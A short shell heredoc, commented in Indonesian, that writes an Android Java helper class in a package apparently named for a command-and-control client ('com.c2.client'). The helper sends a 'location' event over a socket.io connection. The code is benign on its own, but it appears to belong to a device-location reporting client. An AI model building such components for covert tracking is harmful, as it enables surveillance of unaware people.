# ═══ Emitter.java — WAJIB, ini yang nyelesaiin bug location ═══
cat > app/src/main/java/com/c2/client/Emitter.java << 'EOF'
package com.c2.client;

import io.socket.client.Socket;
import org.json.JSONObject;

public class Emitter {
    public static void emitLocation(Socket socket, JSONObject o) {
        if (socket != null && o != null) {
            socket.emit("location", o);
        }
    }
}
EOF
